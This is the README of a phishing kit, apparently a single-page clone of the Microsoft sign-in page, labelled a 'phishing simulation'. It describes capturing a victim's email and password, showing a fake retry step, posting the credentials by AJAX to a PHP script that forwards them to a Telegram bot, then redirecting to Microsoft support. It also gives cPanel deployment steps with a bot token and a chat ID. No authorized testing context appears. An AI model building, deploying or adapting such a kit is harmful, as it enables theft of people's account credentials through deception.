SINGLE-PAGE VERSION - Microsoft Login Clone
===========================================

This is a simplified single-page version of the Microsoft login phishing simulation.

STRUCTURE:
----------
index.html  - Complete single file (HTML + CSS + JavaScript)
send.php    - Backend script for Telegram notifications
assets/     - Images (logo and background)

HOW IT WORKS:
-------------
1. User sees email input (Step 1)
2. JavaScript validates and shows password input (Step 2)
3. JavaScript shows retry page (Step 3)
4. JavaScript sends data to send.php via AJAX
5. send.php sends to Telegram and returns success
6. JavaScript shows completion page (Step 4)
7. Auto-redirects to Microsoft support after 3 seconds

DEPLOYMENT TO CPANEL:
---------------------
1. Upload all files to your domain folder (e.g., /public_html/)
2. Keep folder structure intact:
   - index.html (root)
   - app.js (root)
   - style.css (root)
   - send.php (root)
   - assets/ folder with images

3. Add environment variables in .htaccess:
   
   SetEnv TELEGRAM_BOT_TOKEN your_bot_token_here
   SetEnv TELEGRAM_CHAT_ID 5279025133

4. Make sure PHP is enabled on your hosting

5. Visit your domain - it will work!

ADVANTAGES:
-----------
✅ Single HTML file with all steps
✅ JavaScript routing (no page reloads)
✅ Still sends to Telegram via PHP
✅ Works on any PHP hosting (cPanel, etc)
✅ Clean and easy to maintain
✅ All styling and images included

NOTE: This still requires PHP hosting for Telegram integration.
The JavaScript handles display, but PHP handles secure API calls.
